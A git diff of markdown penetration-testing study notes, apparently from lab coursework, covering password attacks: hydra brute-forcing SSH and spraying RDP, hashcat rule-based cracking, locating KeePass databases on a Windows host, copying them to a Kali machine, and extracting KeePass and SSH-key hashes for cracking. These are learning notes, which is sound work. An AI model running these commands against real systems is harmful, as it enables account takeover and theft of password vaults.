@@ -605,7 +605,7 @@ Install Wsgidav (Web Distributed Authoring and Versioning): allow clients to upl
 ### 15. Password attacks  
 - **attack network services login**  
   - SSH  
-   `hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.50.201`  -l username, -p password wordlist, -s port  
+   `hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.50.201`   
   - RDP (password spraying)  
    `echo -e "daniel\njustin" | sudo tee -a /usr/share/wordlists/dirb/others/names.txt`: add users  
    `hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://192.168.50.202`  
@@ -636,28 +636,27 @@ Install Wsgidav (Web Distributed Authoring and Versioning): allow clients to upl
     Password!1
     ```
   - capitalization of the first letter + "!" special chr + numerical values  
-    `hashcat -m 0 crackme.txt /usr/share/wordlists/rockyou.txt -r demo3.rule --force`  -m hash type, 0 is MD5
-    Output cracked status: f621b6c9eab51a3e2f4e167fee4c6860:Computer123! 
+    `hashcat -m 0 crackme.txt /usr/share/wordlists/rockyou.txt -r demo3.rule --force`  -m hash type, 0 is MD5  
+    Output cracked status: f621b6c9eab51a3e2f4e167fee4c6860:Computer123!  
   - hashcat rules `ls -la /usr/share/hashcat/rules/`
 - **craking methodology**: extract hashed > format hashes > calculate the cracking time > prepare wordlist > attack the hash
  - identify the hash type:[hash-identifier](https://www.kali.org/tools/hash-identifier/), [hashid](https://www.kali.org/tools/hashid/)
  - hash-identifier "4a41e0fdfb57173f8156f58e49628968a8ba782d0cd251c6f3e2426cb36ced3b647bf83057dabeaffe1475d16e7f62b7": SHA-384
  - bcrypt hashes always start with $2a$, $2b$, or $2y$: "$2y$10$XrrpX8RD6IFvBwtzPuTlcOqJ8kO2px2xsh17f60GZsBKLeszsQTBC"  
 - **Password mananger**
-  - Searching for KeePass database files
+  - Searching for KeePass database files  
     `Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue`
-  - transfer the db file to our Kali
+  - transfer the db file to our Kali  
     `xfreerdp3 /u:jason /p:lab /v:192.168.161.203 /cert:ignore /drive:share,/home/kali/share`  
-  - Using keepass2john to format the KeePass database for Hashcat
-    `keepass2john Database.kdbx > keepass.hash`
-    `cat keepass.hash`  remove the "Database"
-    `$keepass$*2*60*0*d74e29a727e9338717d27a7d457ba3486d20dec73a9db1a7fbc7a068c9aec6bd*04b0bfd787898d8dcd4d463ee768e55337ff001ddfac98c961219d942fb0cfba*5273cc73b9584fbd843d1ee309d2ba47*1dcad0a3e50f684510c5ab14e1eecbb63671acae14a77eff9aa319b63d71ddb9*17c3ebc9c4c3535689cb9cb501284203b7c66b0ae2fbf0c2763ee920277496c1
-`
-  - Finding the mode of KeePass in Hashcat
+  - Using keepass2john to format the KeePass database for Hashcat  
+    `keepass2john Database.kdbx > keepass.hash`  
+    `cat keepass.hash`  remove the "Database"  
+       `$keepass$*2*60*0*d74e29a727e9338717d27a7d457ba3486d20dec73a9db1a7fbc7a068c9aec6bd*04b0bfd787898d8dcd4d463ee768e55337ff001ddfac98c961219d942fb0cfba*5273cc73b9584fbd843d1ee309d2ba47*1dcad0a3e50f684510c5ab14e1eecbb63671acae14a77eff9aa319b63d71ddb9*17c3ebc9c4c3535689cb9cb501284203b7c66b0ae2fbf0c2763ee920277496c1`  
+  - Finding the mode of KeePass in Hashcat  
     `hashcat --help | grep -i "KeePass"`  > 13400 | KeePass 1 (AES/Twofish) and KeePass 2 (AES)  | Password Manager
-  - Cracking the KeePass database hash
+  - Cracking the KeePass database hash  
     `hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force` > qwertyuiop123!
-- **SSH private key passphrase**
+- **SSH private key passphrase**  
   - Using ssh2john to format the hash  
     `ssh2john id_rsa > ssh.hash`  `cat ssh.hash` 
     id_rsa:$sshng**$6**$16$7059e78a8d3764ea1e8...  
